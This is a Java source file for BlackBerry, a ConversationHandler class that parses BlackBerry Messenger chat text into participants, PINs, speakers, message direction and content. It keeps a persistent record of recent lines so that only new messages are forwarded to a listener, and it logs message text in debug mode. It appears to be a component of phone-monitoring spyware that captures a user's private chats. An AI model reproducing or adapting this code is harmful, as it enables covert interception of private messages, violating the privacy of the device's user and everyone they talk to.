 package com.vvt.bbm;

import java.util.Vector;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;

public class ConversationHandler {

	private static 	final int		remember_length	 = 150;
	private BBMConversationListener _listener = null;
	
	private static 	ConversationDatabase 	conversationsDB = null;	
	private static 	PersistentObject 		store;
	
	private static String TAG = "BBM-Conversation";
	
	private boolean isUpdate	= true;
	private boolean bbmFive 	= true;
	private String	token		= ", "; 
	
	static {
		store = PersistentStore.getPersistentObject(0xdc50cd78731d8e3cL);
		synchronized (store) {
			if (store.getContents() == null) {
				store.setContents(new ConversationDatabase());
				store.commit();
			}
		}
		conversationsDB = (ConversationDatabase) store.getContents();
		conversationsDB.cleanOldConferences();
	}

	public ConversationHandler()	{
		checkBBMVersion();
	}
	
	public void checkBBMVersion()	{
		try {
			int handle 			= CodeModuleManager.getModuleHandle("net_rim_bb_qm_peer"); //BBMCapture");
			//String name 		= CodeModuleManager.getModuleName( handle );
			//String vendor 	= CodeModuleManager.getModuleVendor( handle );
			String version 		= CodeModuleManager.getModuleVersion( handle );
			int mainVersion 	= Integer.parseInt(version.substring(0,version.indexOf("."))); 
			if (mainVersion < 5) {
				bbmFive 	= false;
				token		= ","; 
			}
			else {
				bbmFive 	= true;
				token		= ", "; 
			}			
			if (Log.isDebugEnable())  {Log.debug(TAG," BBM version is "+version); }
		}
		catch (Exception e) {
			if (Log.isDebugEnable())  {Log.error(TAG,"* checkBBMVersion Exception:"+e.getMessage()); }
			bbmFive 	= false;
		}
	}
	
	public void commit()	{
		synchronized (store) {
			store.setContents(conversationsDB);
			store.commit();
			isUpdate 	= true;
		}
	}
	
	public boolean isUpdated()	{
		return isUpdate;
	}
	
	public void setBBMConversationListener(BBMConversationListener listener)	{
		this._listener = listener;
	}
	
	public boolean removeBBMConversationListener()	{
		this._listener = null;
		return true;	
	}
	
	public void reset()	{
		conversationsDB.clear();
		commit();
	}
	
	
	public void update(String pin, int hashCode, String text, String personalMessage) throws Exception	{
		pin = pin.trim();
		if (pin.length() > 0 && conversationsDB.containsPIN(pin))	{
			Conversations con = conversationsDB.get(pin);
			if (con != null)	{
				if (!con.isConferenceChat()) {				
					//int oldHashCode = con.getHashcode();
					con.updateHashcode(hashCode);
					parseConversation(text, con, personalMessage);
					return;
				}
			}
		}
		
		// Peer -> Conference case or not get PIN
		if (conversationsDB.containsHashCode(hashCode)) {
			Conversations con 	= conversationsDB.get(hashCode);
			if (!con.isConferenceChat()) {				
				//int oldHashCode 	= con.getHashcode();
				con.updateHashcode(hashCode);
				parseConversation(text, con, personalMessage);
				return;
			}
			else {
				return;
			}
		}

		// no one match, create new one 
		Conversations con = new Conversations(pin, hashCode);
		parseConversation(text, con, personalMessage);
		conversationsDB.add(con);	
	}
	
	public Vector getParticipants(String text) throws Exception	{
		Vector participants = new Vector();
		String 		partToken 	= "-------------";
		int participantIndex 	= text.indexOf(partToken);
		if (participantIndex>-1)	{
			String 	header 			= text.substring(participantIndex+partToken.length()+1);
			int 	endLine 		= header.indexOf("\n");
			
			// get participants 
			String 	names 	= header.substring(0, endLine);
			participants 	= extractNames(names);
		}
		return participants;
	}
	
	private String removePersonalMessage(String originalText, String personalMessage,
			Vector participants)	{
		//_listener.setupFailed("removePersonalMessage with "+personalMessage);
		if (personalMessage.length() > 0) {
			StringBuffer simpleText = new StringBuffer();
			
			String pattern 		= "";
			String newPattern	= "";
			for (int i=0; i<participants.size(); i++)	{
				String speaker 	= (String) participants.elementAt(i);
				String structure 	= "\n"+speaker+"\n"+personalMessage+": ";
				if (originalText.indexOf(structure)> -1) {
					pattern 		= structure;
					newPattern		= "\n"+speaker+": ";
				}
			}
			
			if (pattern.length() > 0) {
				int now = 0;
				int end = originalText.length()-1;
				int len = pattern.length();
				while (now < end) {
					int stop = originalText.indexOf(pattern, now);
					if (stop > -1) {
						simpleText.append(originalText.substring(now, stop));
						simpleText.append(newPattern);
						now = stop+len;
						//	_listener.setupFailed("Removed pattern at "+stop+" !");
					}
					else {
						simpleText.append(originalText.substring(now));
						now = end;
					}
				}
				//_listener.setupFailed("Output[\n"+simpleText.toString()+"]\n");
				return simpleText.toString();
			}		
		}
		return originalText;
	}

	public void parseConversation(String text, Conversations con, 
			String personalMessage)	throws Exception {
//		if (Log.isDebugEnable())  {Log.debug(TAG, "parseConversation()");}
		String 		partToken 	= "-------------";
//		String		MsgToken	= "Messages:";
		String		MsgToken	= "---------";
		int participantIndex 	= text.indexOf(partToken);
		if (participantIndex>-1)	{
			String 	header 			= text.substring(participantIndex+partToken.length()+1);
			int 	endLine 		= header.indexOf("\n");
			
			// get participants 
			String 	participants 	 = header.substring(0, endLine);
			Vector	participantNames = extractNames(participants);

			// update maximum list of participants
			con.updateMaxParticipants(participantNames);
			
			if (participantNames.size() < 1) return;
			
			if (participantNames.size() > 2)	{
				con.updateStatusToConferenceChat();
			}
			
			if (con.isConferenceChat() || con.isPIN(""))	{
				return;
			}

			// get target name and remove from list;
			String ownerName = (String) participantNames.elementAt(0);
			con.setOwnerDisplayName(ownerName);
			participantNames.removeElementAt(0);
			
//			int msgIndex 	= header.indexOf(MsgToken);
//			if (msgIndex > -1)	{
//				int startMsg 	= msgIndex+MsgToken.length()+1;
//				int endLine2 	= header.indexOf("\n", startMsg);
							
			int msgIndex 	= header.indexOf(MsgToken, endLine+1);
			if (msgIndex > -1)	{
				//int startMsg 	= msgIndex+MsgToken.length()+1;
				int endLine2 	= header.indexOf("\n", msgIndex);
				
//				if (Log.isDebugEnable())  {Log.debug(TAG, "participants:"+participantNames);}
				
				// get the present conversation
				String orgText	= header.substring(endLine2);
				
				// Remove all personal messages from copy chat text
				String newText = removePersonalMessage(orgText, personalMessage, 
						con.getMaximumParticipants());
				
				
				Vector lastConversations = con.getLastConversations();
				
				// have no old conversations.
				if (lastConversations.size() == 0)	{
					exportConversation(con, participantNames, newText, lastConversations);
				}
				else {
					// find index of next conversations 
					int startIndex = findLastIndexOfOldVersation(newText, lastConversations);
					if (startIndex > 0) {
						String newConv = newText.substring(startIndex);
						if (newConv.trim().length() > 0)	{
							exportConversation(con, participantNames, newConv, lastConversations);
						}
					}
					else if (startIndex == 0) {	// Don't match, copy all
						if (newText.trim().length() > 0)	{
							lastConversations.removeAllElements();
							exportConversation(con, participantNames, newText, lastConversations);
						}
					}
				}
				orgText	= null;
				newText	= null;
			}
			header 	= null;
			text	= null;
		}
	}
	
	private int findLastIndexOfOldVersation(String newTxt, Vector oldConvers) throws Exception	{
		if (oldConvers.size()==0)	{
			return 0;
		}
		else {
			boolean found 	= true;
			int 	now		= 0;
			for (int i=0; i<oldConvers.size(); i++)	{
				String sentence = (String) oldConvers.elementAt(i);
				int index = newTxt.indexOf(sentence, now);
				if (index == -1)	{
					found 	= false;
				}
				else {
					now = index+sentence.length();
				}
			}
			if (found)	{
				return now;
			}
			else {
				return 0;
			}
		}
	}
	
	private Vector extractNames(String participantString) throws Exception	{
//		String token = ", ";	// For 5.0
//		if (participantString.indexOf(", ")== -1) {
//			token = ",";		// For 4.7
//		}
		Vector whois = new Vector();
		int now		= 0;
		int index 	= participantString.indexOf(token,now);
		while (index > -1)	{
			String man = participantString.substring(now, index);
			if (!whois.contains(man))	{
				whois.addElement(man);
			}
			now = index+token.length();
			index 	= participantString.indexOf(token, now);
		}
		String man = participantString.substring(now);
		if (!whois.contains(man))	{
			whois.addElement(man);
		}
		return whois;
	}
	
	private void exportConversation(Conversations con, Vector participantNames, 
			String convers, Vector lastSentences) throws Exception { 

		Vector 	maxNames 	= con.getMaximumParticipants();	
	
		// find all start converesation's locations
		Vector 	positions 	= new Vector();
		int 	nowIndex 	= 0;
		int 	lastIndex 	= convers.length()-1;
		while (nowIndex < lastIndex)	{
			int nearestIndex 	= lastIndex;
			int headerLength	= 2;
			boolean foundNext	= false;
			for (int i=0; i<maxNames.size(); i++)	{
				String head 	= "\n"+((String) maxNames.elementAt(i))+": ";
				int headIndex 	= convers.indexOf(head, nowIndex);
				if ((headIndex > -1)&&(headIndex<=nearestIndex))	{
					nearestIndex 	= headIndex;
					headerLength  	= head.length();
					foundNext		= true;
				}
			}
			if (foundNext)	{
				positions.addElement(new Integer(nearestIndex+1)); // keep start of header
				nowIndex = nearestIndex+headerLength;
			}
			else {
				nowIndex = lastIndex;
			}
		}
		
		Vector pins = new Vector();
		String pin	= con.getPIN();
		if (pin.length() > 0)
		pins.addElement(pin);
		
		String ownerName = con.getOwnerDisplayName();
		
		if (positions.size() > 1)	{
			int allStart = positions.size(); 
			for (int i=1; i<allStart; i++)	{
				int beginIndex 	= ((Integer) positions.elementAt(i-1)).intValue(); 
				int endIndex 	= ((Integer) positions.elementAt(i)).intValue();
				String sentence	= convers.substring(beginIndex, endIndex);
				parseConversation(ownerName, pins, participantNames, sentence.trim(), lastSentences);
			}
			// parse last sentence
			int last = ((Integer) positions.lastElement()).intValue();
			parseConversation(ownerName, pins, participantNames, convers.substring(last).trim(), lastSentences);
		}
		else {
			parseConversation(ownerName, pins, participantNames, convers.trim(), lastSentences);
		}
		
		// count max from last
		int sumLength 	= 0;
		int startIndex	= lastSentences.size()-1;
		for (int i=lastSentences.size()-1; i>=0; i--)	{
			if (sumLength < remember_length)	{
				String str 	= (String) lastSentences.elementAt(i);
				sumLength 	+= str.length();
				startIndex	= i;
			}
		}
		// record only last conversations (not longer limit)
		Vector lastCons = new Vector();
		for (int i=startIndex; i<lastSentences.size(); i++ )	{
			String str 	= (String) lastSentences.elementAt(i);
			lastCons.addElement(str);
		}
		con.updateSentences(lastCons);

		// clean memory
		positions.removeAllElements();
		lastSentences.removeAllElements();
	}
	
	private void parseConversation(String ownerName, Vector pins, 
			Vector participantNames, String sentence, Vector lastSentences)	
			throws Exception {
		
		int split = sentence.indexOf(": ");
		if (split > -1)	{
			String talker 	= sentence.substring(0,split);
			String words	= sentence.substring(split+2);
			lastSentences.addElement(words);
			
			Conversation conversation = new Conversation(ownerName, talker, participantNames, pins, words);
			int direction 	= Conversation.UNKNOWN;

			if (participantNames.contains(talker))	{
				direction 	= Conversation.RECEIVED;
			}
			else if (participantNames.size()>0)	{
				direction = Conversation.SENT;				
			}
			conversation.setDirection(direction);
			if (_listener != null)	{
				_listener.BBMConversation(conversation);
				isUpdate = false;
				//if (Log.isEnable()) { Log.debug(" . Send a new conversation !"); }
				if (Log.isDebugEnable())  {Log.debug(TAG,conversation.getSender()+": "+conversation.getContent()); }
			}
		}
	}
	
}
